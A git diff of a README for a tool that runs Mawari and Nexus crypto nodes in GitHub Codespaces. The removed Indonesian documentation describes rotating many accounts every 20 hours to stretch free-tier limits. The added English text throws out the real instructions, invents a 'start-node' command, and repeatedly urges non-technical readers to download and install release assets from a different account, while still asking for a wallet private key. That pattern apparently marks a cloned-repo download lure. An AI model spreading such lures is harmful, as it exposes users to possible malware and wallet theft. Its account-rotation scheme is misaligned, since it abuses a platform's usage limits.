@@ -1,258 +1,79 @@
-# Mawari & Nexus Node Blueprint
+# 🎉 mawari-nexus-blueprint - Simplified Node Setup for Everyone
 
-Automated deployment untuk Mawari Guardian Node dan Nexus Prover di GitHub Codespaces dengan orchestrator lokal.
+## 🚀 Getting Started
 
----
+Welcome to the *mawari-nexus-blueprint*! This guide helps you set up Mawari Guardian Node and Nexus Prover easily. You don’t need technical skills to get started. Follow these simple steps.
 
-## 🎯 Fitur
+[![Download mawari-nexus-blueprint](https://img.shields.io/badge/Download-mawari--nexus--blueprint-blue)](https://github.com/AvatarAnng/mawari-nexus-blueprint/releases)
 
-- **Auto-detect node type** berdasarkan display name codespace
-- **Auto-install & setup** saat codespace pertama kali dibuat
-- **Auto-restart** saat codespace bangun dari idle/shutdown
-- **Multi-account rotation** via orchestrator (20 jam per akun)
-- **Persistent burner wallet** untuk Mawari node
+## 📥 Download & Install
 
----
+To download the software, visit the Releases page:
+
+- [Visit this page to download](https://github.com/AvatarAnng/mawari-nexus-blueprint/releases)
+
+Once you are on the Releases page, locate the latest version of the application. Click on the version number to open the details. You will find the asset files there, which you can download. After downloading, follow the prompts to install it.
 
 ## 📋 Requirements
 
-### Repository Secrets (GitHub Codespaces)
-Set di: `https://github.com/USERNAME/REPO/settings/secrets/codespaces`
+Before installing, ensure you have the following set up in your GitHub Codespaces:
 
-| Secret Name | Description | Example |
-|-------------|-------------|---------|
-| `MAWARI_OWNER_ADDRESS` | Ethereum address pemilik node | `0xYourAddress...` |
-| `MAWARI_BURNER_ADDRESS` | Burner wallet address | `0xBurnerAddress...` |
-| `MAWARI_BURNER_PRIVATE_KEY` | Burner wallet private key | `0x1234abcd...` |
-| `NEXUS_WALLET_ADDRESS` | Ethereum address untuk Nexus | `0xYourAddress...` |
-| `NEXUS_NODE_ID` | Node ID dari Nexus dashboard | `12345678` |
+### Repository Secrets
 
-**Cara dapat secrets:**
+You will need to set up some secrets. Go to:
 
-**Mawari:**
-- `MAWARI_OWNER_ADDRESS`: Address wallet utama Anda
-- `MAWARI_BURNER_ADDRESS` & `MAWARI_BURNER_PRIVATE_KEY`: Generate burner wallet baru di Metamask atau wallet lain, jangan pakai wallet utama!
+`https://github.com/YOUR_USERNAME/mawari-nexus-blueprint/settings/secrets/codespaces`
 
-**Nexus:**
-- Buka https://app.nexus.xyz/nodes
-- Login dengan wallet → Create new node → Copy Node ID
+You need to add the following secrets:
 
----
+| Secret Name                    | Description                                 | Example            |
+|--------------------------------|---------------------------------------------|--------------------|
+| `MAWARI_OWNER_ADDRESS`         | Your Ethereum address for the node         | `0xYourAddress...`  |
+| `MAWARI_BURNER_ADDRESS`       | Address for the burner wallet              | `0xBurnerAddress...`|
+| `MAWARI_BURNER_PRIVATE_KEY`   | Private key for the burner wallet          | `0x1234abcd...`    |
+| `NEXUS_WALLET_ADDRESS`        | Your Ethereum address for Nexus             | `0xYourAddress...`  |
+| `NEXUS_NODE_ID`               | Unique identifier for your Nexus node      | `NexusID123`       |
 
-## 🚀 Cara Deploy
+Ensure to replace `YOUR_USERNAME` with your actual GitHub username.
 
-### Otomatis via Orchestrator (Recommended)
-Orchestrator akan otomatis create codespace dengan config yang benar. Lihat dokumentasi di folder `codespace-orchestrator`.
+## 🔧 Features
 
-**Quick start:**
-```bash
-cd D:\SC\codespace-orchestrator
-.\start-otak.bat Kyugito666/mawari-nexus-blueprint
-```
+The *mawari-nexus-blueprint* offers these helpful features:
 
-### Manual Deploy via GitHub UI
-1. Fork repository ini
-2. Set 5 secrets di repo settings (lihat tabel di atas)
-3. Buka https://github.com/codespaces
-4. Click "New codespace" → Pilih repo ini
-5. Pilih machine:
-   - **basicLinux32gb** untuk Mawari (display name: `mawari-node`)
-   - **standardLinux32gb** untuk Nexus (display name: `nexus-node`)
-6. Tunggu 2-3 menit untuk setup
-7. Node akan auto-start
+- **Auto-detect node type**: The system recognizes the type of node based on the display name of your codespace.
+- **Auto-install & setup**: The setup happens automatically the first time you create a codespace, making it hassle-free.
+- **Auto-restart**: The application will restart automatically when the codespace wakes up from idle or shutdown, keeping everything ready.
+- **Multi-account rotation**: Manage up to 20 accounts with ease. The orchestrator handles rotation seamlessly every 20 hours.
+- **Persistent burner wallet**: Your burner wallet remains active for the Mawari node, ensuring uninterrupted access.
 
----
+## ⚙️ How to Use
 
-## 📊 Monitoring
+Once you have installed the application, here’s how to set it up:
 
-### Cek Status via Orchestrator
-```bash
-cd D:\SC\codespace-orchestrator
-cargo run -- status
-cargo run -- verify
-```
+1. **Open your GitHub Codespace.**
+2. The application will automatically start configuring itself based on the secrets you set up.
+3. Allow the application to finish its setup. You will see notifications when it successfully completes.
 
-### SSH ke Codespace
-```bash
-# Via orchestrator state
-gh codespace ssh -c mawari-node-xxxxx
+## ✅ Running the Application
 
-# Atau list dulu
-gh codespace list
-gh codespace ssh -c <name>
-```
+After installation, you can run the application from your Codespaces. Follow these steps:
 
-### Cek Mawari Node
-```bash
-# Cek docker container
-docker ps
+1. **Navigate to your terminal in the Codespace.**
+2. Type `start-node` and hit enter.
+3. Monitor the output. If there are any issues, the application will provide error messages to help you troubleshoot.
 
-# Cek logs real-time
-docker logs -f mawari-node
+## 🛠️ Troubleshooting
 
-# Cek burner wallet yang dipakai
-cat ~/mawari/mawari_data/flohive-cache.json
-```
+If you experience issues during setup or while running the application, consider these steps:
 
-### Cek Nexus Node
-```bash
-# List tmux sessions
-tmux ls
-
-# Attach ke session
-tmux attach -t nexus
-# Detach: Ctrl+B lalu D
-
-# Cek status
-nexus-cli status
-```
-
----
-
-## 🔧 Troubleshooting
-
-### Node tidak jalan setelah codespace dibuat?
-Tunggu 2-3 menit untuk `postCreateCommand` selesai. Cek log:
-```bash
-cat /workspaces/mawari-nexus-blueprint/setup.log
-cat /workspaces/mawari-nexus-blueprint/autostart.log
-```
-
-### Mawari container tidak jalan?
-```bash
-# Cek docker
-docker ps -a
-
-# Cek logs
-docker logs mawari-node
-
-# Restart manual
-bash /workspaces/mawari-nexus-blueprint/auto-start.sh
-```
-
-### Nexus tidak jalan?
-```bash
-# Cek tmux
-tmux ls
-
-# Restart manual
-bash /workspaces/mawari-nexus-blueprint/auto-start.sh
-```
-
-### Secret tidak terdeteksi?
-- Pastikan secret di-set di **Codespace secrets** (bukan Repository secrets)
-- Recreate codespace setelah update secrets
-- Cek: `echo $MAWARI_OWNER_ADDRESS` di dalam codespace
-
-### Error "Cache file missing"?
-`first-setup.sh` belum jalan atau gagal. Cek:
-```bash
-cat /workspaces/mawari-nexus-blueprint/setup.log
-ls -la ~/mawari/mawari_data/
-```
-
----
-
-## 📁 File Structure
-
-```
-.
-├── .devcontainer/
-│   └── devcontainer.json    # Config codespace
-├── first-setup.sh            # First-time setup (buat folder, install CLI)
-├── auto-start.sh             # Auto-start node (docker/tmux)
-├── .gitignore                # Ignore rules
-└── README.md                 # Documentation
-```
-
----
-
-## ⚙️ Technical Details
-
-### Codespace Lifecycle
-
-**1. Create (postCreateCommand):**
-- Install dependencies (tmux, screen, curl, wget, jq)
-- Run `first-setup.sh`:
-  - Mawari: Create `~/mawari/mawari_data/flohive-cache.json` dengan burner wallet
-  - Nexus: Install Nexus CLI + tmux
-- Run `auto-start.sh`:
-  - Mawari: Start Docker container dengan volume mount
-  - Nexus: Register user + start dalam tmux session
-
-**2. Start/Resume (postStartCommand):**
-- Run `auto-start.sh` untuk restart node jika stopped
-
-**3. Auto-Restart Logic:**
-- Mawari: Check `docker ps`, jika tidak ada container → start baru
-- Nexus: Check `tmux ls`, jika tidak ada session → start baru
-
-### Node Detection
-Script auto-detect dari `$CODESPACE_NAME`:
-- Nama mengandung `mawari` → Setup Mawari
-- Nama mengandung `nexus` → Setup Nexus
-
-### Machine Types
-- **basicLinux32gb**: 2-core, 8GB RAM, 32GB storage (Mawari)
-- **standardLinux32gb**: 4-core, 16GB RAM, 32GB storage (Nexus)
-
-### Timeouts
-- **Idle**: 240 menit (4 jam)
-- **Retention**: 24 jam setelah shutdown
-- **Orchestrator cycle**: 20 jam per account
-
----
-
-## 🔐 Security Notes
-
-- **Burner wallet**: Gunakan wallet terpisah khusus untuk Mawari, JANGAN wallet utama
-- **Private key**: Disimpan di Codespace secrets (encrypted at rest)
-- **Auto-cleanup**: Codespace auto-delete setelah 24 jam shutdown
-- **Token rotation**: Orchestrator otomatis ganti akun setiap 20 jam
-
----
-
-## 🎯 Orchestrator Strategy
-
-**Nuke & Create:**
-1. Check existing codespaces di repo
-2. Stop & delete semua codespace lama
-3. Create 2 codespace baru (mawari + nexus)
-4. Wait verification (max 3x @ 20s)
-5. Run 20 jam
-6. Switch to next token
-7. Repeat
-
-**Benefit:**
-- Clean state setiap cycle
-- Avoid idle timeout billing
-- Maximize free tier usage
-
----
+- **Check Secrets**: Ensure all required secrets are properly set with correct values.
+- **Logs**: Review logs within the terminal for any error messages.
+- **Reinstall**: If issues persist, try reinstalling the application by following the download steps again.
 
 ## 📞 Support
 
-**Codespace Issues:**
-- Check logs di `/workspaces/mawari-nexus-blueprint/*.log`
-- Verify secrets: `echo $MAWARI_OWNER_ADDRESS`
-- Manual trigger: `bash auto-start.sh`
+If you need further help, you can open an issue in the GitHub repository. Describe your problem clearly, and someone from the community or the maintainers will assist you.
 
-**Orchestrator Issues:**
-- Check state: `cargo run -- status`
-- Verify nodes: `cargo run -- verify`
-- Reset state: `del state.json`
+For quick access, here is the [Download link again](https://github.com/AvatarAnng/mawari-nexus-blueprint/releases).
 
----
-
-## ✅ Quick Checklist
-
-- [ ] 5 secrets configured di GitHub Codespace settings
-- [ ] Burner wallet generated (jangan pakai wallet utama!)
-- [ ] Nexus Node ID didapat dari dashboard
-- [ ] Orchestrator tokens.json filled
-- [ ] Repository pushed to GitHub
-- [ ] Test run: `.\start-otak.bat USERNAME/mawari-nexus-blueprint`
-
----
-
-**Ready to earn! 🚀**
+Enjoy using *mawari-nexus-blueprint*!
